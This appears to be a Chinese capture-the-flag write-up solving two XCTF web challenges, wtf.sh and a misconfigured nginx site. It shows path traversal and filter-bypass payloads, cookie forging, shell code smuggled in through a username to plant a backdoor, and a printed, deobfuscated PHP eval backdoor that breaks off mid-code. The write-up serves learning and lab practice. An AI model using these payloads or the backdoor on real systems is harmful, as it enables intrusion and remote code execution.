<p><img src="https://img-blog.csdnimg.cn/20200819132858350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>看来也不行</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129202129009.png" alt="image-20230129202129009"></p>
<p>我们发送的时候，看到有个参数，我们试试目录穿越<br>使用..&#x2F;</p>
<p><img src="https://img-blog.csdnimg.cn/20200819133225933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>发现了源码泄露</p>
<p><img src="https://img-blog.csdnimg.cn/20200819133332748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>那么我们代码审计</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129202743222.png" alt="image-20230129202743222"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/css/std.css&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">$ if contains &#x27;user&#x27; $&#123;!URL_PARAMS[@]&#125; &amp;&amp; file_exists &quot;users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;&quot;</span><br><span class="line">$ then</span><br><span class="line">$   local username=$(head -n 1 users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;);</span><br><span class="line">$   echo &quot;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>$&#123;username&#125;&#x27;s posts:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&quot;;</span><br><span class="line">$   echo &quot;<span class="tag">&lt;<span class="name">ol</span>&gt;</span>&quot;;</span><br><span class="line">$   get_users_posts &quot;$&#123;username&#125;&quot; | while read -r post; do</span><br><span class="line">$       post_slug=$(awk -F/ &#x27;&#123;print $2 &quot;#&quot; $3&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;post&#125;&quot;);</span><br><span class="line">$       echo &quot;<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>&quot;/<span class="attr">post.wtf</span>?<span class="attr">post</span>=<span class="string">$&#123;post_slug&#125;\</span>&quot;&gt;</span>$(nth_line 2 &quot;$&#123;post&#125;&quot; | htmlentities)<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>&quot;;</span><br><span class="line">$   done </span><br><span class="line">$   echo &quot;<span class="tag">&lt;/<span class="name">ol</span>&gt;</span>&quot;;</span><br><span class="line">$   if is_logged_in &amp;&amp; [[ &quot;$&#123;COOKIES[&#x27;USERNAME&#x27;]&#125;&quot; = &#x27;admin&#x27; ]] &amp;&amp; [[ $&#123;username&#125; = &#x27;admin&#x27; ]]</span><br><span class="line">$   then</span><br><span class="line">$       get_flag1</span><br><span class="line">$   fi</span><br><span class="line">$ fi</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里写的，如果我们登录时cookies是admin同时username&#x3D;admin<br>我们即可获得flag</p>
<p><img src="https://img-blog.csdnimg.cn/20200819151646872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>我们看到有一些user<br>同时他是users的目录<br>我们试试users<br>看看能不能进行读取</p>
<p><img src="https://img-blog.csdnimg.cn/20200819151812275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200309162142234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="图八"></p>
<p>果然发现了加密信息之类的，我们怀疑他是token</p>
<p><img src="https://img-blog.csdnimg.cn/20200819152354345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>果然他给我们赋值了，我们正常发东西即可，修改cookie即可</p>
<p><img src="https://img-blog.csdnimg.cn/20200819153918560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>在返回包中因为有set cookie<br>所以我们直接修改</p>
<p><img src="https://img-blog.csdnimg.cn/202008191544453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>我们在profile处找到了前半个flag<br>我们继续分析之前泄露的源码<br>因为整个网站都是wtf的文件，所以我们看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">max_page_include_depth=<span class="number">64</span></span><br><span class="line">page_include_depth=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">include_page</span> </span>&#123;</span><br><span class="line">    <span class="comment"># include_page pathname</span></span><br><span class="line">    local pathname=$<span class="number">1</span></span><br><span class="line">    local cmd=</span><br><span class="line">    [[ $&#123;<span class="title function_ invoke__">pathname</span>(-<span class="number">4</span>)&#125; = <span class="string">&#x27;.wtf&#x27;</span> ]];</span><br><span class="line">    local can_execute=$;</span><br><span class="line">    page_include_depth=$((<span class="variable">$page_include_depth</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$page_include_depth</span> -lt <span class="variable">$max_page_include_depth</span> ]]</span><br><span class="line">    then</span><br><span class="line">        local line;</span><br><span class="line">        <span class="keyword">while</span> read -r line; <span class="keyword">do</span></span><br><span class="line">            <span class="comment"># check if we&#x27;re in a script line or not ($ at the beginning implies script line)</span></span><br><span class="line">            <span class="comment"># also, our extension needs to be .wtf</span></span><br><span class="line">            [[ $ = $&#123;line01&#125; &amp;&amp; $&#123;can_execute&#125; = <span class="number">0</span> ]];</span><br><span class="line">            is_script=$;</span><br><span class="line">            <span class="comment"># execute the line.</span></span><br><span class="line">            <span class="keyword">if</span> [[ <span class="variable">$is_script</span> = <span class="number">0</span> ]]</span><br><span class="line">            then</span><br><span class="line">                cmd+=$<span class="string">&#x27;n&#x27;</span>$&#123;line<span class="comment">#$&#125;;</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> [[ -n <span class="variable">$cmd</span> ]]</span><br><span class="line">                then</span><br><span class="line">                    <span class="keyword">eval</span> <span class="variable">$cmd</span>  log <span class="built_in">Error</span> during execution of $&#123;cmd&#125;;</span><br><span class="line">                    cmd=</span><br><span class="line">                fi</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$line</span></span><br><span class="line">            fi</span><br><span class="line">        done  $&#123;pathname&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> pMax <span class="keyword">include</span> depth exceeded!p</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200819155533194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="img"></p>
<p>这里有一个replay功能</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reply</span> </span>&#123;</span><br><span class="line">    local post_id=$<span class="number">1</span>;</span><br><span class="line">    local username=$<span class="number">2</span>;</span><br><span class="line">    local text=$<span class="number">3</span>;</span><br><span class="line">    local hashed=$(hash_username <span class="string">&quot;$&#123;username&#125;&quot;</span>);</span><br><span class="line">    curr_id=$(<span class="keyword">for</span> d in posts/$&#123;post_id&#125;<span class="comment">/*; do basename $d; done | sort -n | tail -n 1);</span></span><br><span class="line"><span class="comment">    next_reply_id=$(awk &#x27;&#123;print $1+1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;curr_id&#125;&quot;);</span></span><br><span class="line"><span class="comment">    next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;);</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;username&#125;&quot; &gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    echo &quot;RE: $(nth_line 2 &lt; &quot;posts/$&#123;post_id&#125;/1&quot;)&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;text&#125;&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    # add post this is in reply to to posts cache</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;post_id&#125;/$&#123;next_reply_id&#125;&quot; &gt;&gt; &quot;users_lookup/$&#123;hashed&#125;/posts&quot;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<p>这行代码把用户名写在了评论文件的内容中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$&#123;username&#125;&quot;</span> &gt; <span class="string">&quot;$&#123;next_file&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>flag2太难搞了，我们只能抄师傅们作业了</p>
<p>如果用户名是一段可执行代码，而且写入的文件是 wtf 格式的，那么这个文件就能够执行我们想要的代码。 （而且wtf.sh只运行文件扩展名为.wtf的脚本和前缀为’$’的行）</p>
<p>${find,&#x2F;,-iname,get_flag2}<br>这里前面加个$是wtf文件执行命令的写法<br>find 所有目录下 不分大小写， get_flag2的名字的文件<img src="https://img-blog.csdnimg.cn/20200819163431199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>我们首先上传这样一个wtf文件<br>然后我们进行访问</p>
<p><img src="https://img-blog.csdnimg.cn/20200819163508810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>%09是水平制表符，必须添加，不然后台会把我们的后门当做目录去解析。<br>获得 flag2 所在的路径。</p>
<p>继续构造用户名为恶意代码。$&#x2F;usr&#x2F;bin&#x2F;get_flag2 写入后门：</p>
<p>访问后门，得到Flag: 149e5ec49d3c29ca} ļv’ RE: hello</p>
<p>拼接得到xctf{cb49256d1ab48803149e5ec49d3c29ca}</p>
<h2 id="57-web-php-wrong-nginx-config"><a href="#57-web-php-wrong-nginx-config" class="headerlink" title="57.web_php_wrong_nginx_config"></a>57.web_php_wrong_nginx_config</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230130195446566.png" alt="image-20230130195446566"></p>
<p>尝试SQL注入，没什么发现</p>
<p>扫描目录，发现&#x2F;admin目录和&#x2F;robots.txt</p>
<p>打开robots.txt发现</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230130195843129.png" alt="image-20230130195843129"></p>
<p>查看hint.php</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230130200000869.png" alt="image-20230130200000869"></p>
<p>查看Hack.php</p>
<p>显示需要登录</p>
<p>抓包看看</p>
<p>数据包中isLogin&#x3D;0，只要把0改成1就可以登陆成功</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230130200618494.png" alt="image-20230130200618494"></p>
<p>管理中心可以前往其他网页</p>
<p>抓包，修改isLogin&#x3D;1，发现</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230130202049913.png" alt="image-20230130202049913"></p>
<p>从hint.php知道文件路径，进行文件读取</p>
<p>发现..&#x2F;被替换为空，可以用….&#x2F;&#x2F;绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext=</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2ff36b22aaca4545a1aa9d12baee8d98.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">location /web-img &#123;</span><br><span class="line">    alias /images/;</span><br><span class="line">    autoindex on;</span><br><span class="line">&#125;</span><br><span class="line">这是开发人员想让我们访问/web-img这个目录，但是没有在/web-img后面加/,导致我们可以构造/web-img../</span><br><span class="line">和alisa拼接起来就成了/images/web-img/../,造成目录穿越漏洞</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;web-img.&#x2F;目录</p>
<p><img src="https://img-blog.csdnimg.cn/fc300ccff5864f059a89e35429b6273e.png" alt="img"></p>
<p>进入网站目录发现有备份文件，下载一下</p>
<p><img src="https://img-blog.csdnimg.cn/210a6906a1ac4a8ba00d2522ba4d3a85.png" alt="img"></p>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$U</span>=<span class="string">&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;</span>;</span><br><span class="line"><span class="variable">$q</span>=<span class="string">&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;</span>;</span><br><span class="line"><span class="variable">$M</span>=<span class="string">&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;</span>;</span><br><span class="line"><span class="variable">$z</span>=<span class="string">&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;</span>;</span><br><span class="line"><span class="variable">$k</span>=<span class="string">&#x27;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>=<span class="string">&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;</span>;</span><br><span class="line"><span class="variable">$N</span>=<span class="string">&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;</span>;</span><br><span class="line"><span class="variable">$C</span>=<span class="string">&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$j</span>=<span class="string">&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;</span>;</span><br><span class="line"><span class="variable">$R</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;rO&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;</span>);</span><br><span class="line"><span class="variable">$J</span>=<span class="string">&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span>=<span class="string">&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;|U&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$j</span>.<span class="variable">$o</span>.<span class="variable">$z</span>.<span class="variable">$x</span>.<span class="variable">$k</span>.<span class="variable">$M</span>.<span class="variable">$J</span>.<span class="variable">$q</span>.<span class="variable">$N</span>.<span class="variable">$U</span>.<span class="variable">$C</span>);</span><br><span class="line"><span class="variable">$g</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> create_function()函数</p>
<p>根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
<p>语法：</p>
<p>1 create_function(string $args,string $code)<br>2 string $args 声明的函数变量部分<br>3 string $code 执行的方法代码部分</p>
<p> 把代码部分输出echo $f；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;42f7&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>]; <span class="comment">// 获取来源URL</span></span><br><span class="line"><span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];  <span class="comment">// 客户端可以理解的编码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>)&#123;</span><br><span class="line">    <span class="variable">$u</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>);  <span class="comment">//解析URL，返回数组</span></span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>);  <span class="comment">//字符串解析成变量</span></span><br><span class="line">    <span class="variable">$q</span>=<span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);  <span class="comment">// 获取数组所有的值</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);  <span class="comment">// 全局正则表达式匹配</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>)&#123;</span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();  <span class="comment">// 开启会话</span></span><br><span class="line">        <span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;  <span class="comment">// 储存用户会话信息</span></span><br><span class="line">        <span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;  <span class="comment">// 切割字符串</span></span><br><span class="line">        <span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;  <span class="comment">// 所有字符转换成小写</span></span><br><span class="line">        <span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));  <span class="comment">// h=***</span></span><br><span class="line">        <span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));  <span class="comment">// f=***</span></span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)</span><br><span class="line">            <span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];  <span class="comment">// p=$h + * + $f</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);  <span class="comment">// 检查字符串的第一次出现的位置</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$e</span>)&#123;</span><br><span class="line">                <span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>;</span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 打开输出缓冲区</span></span><br><span class="line">                @<span class="keyword">eval</span>(</span><br><span class="line">                    @<span class="title function_ invoke__">gzuncompress</span>(</span><br><span class="line">                        @<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(</span><br><span class="line">                              <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">                                  <span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>)</span><br><span class="line">                               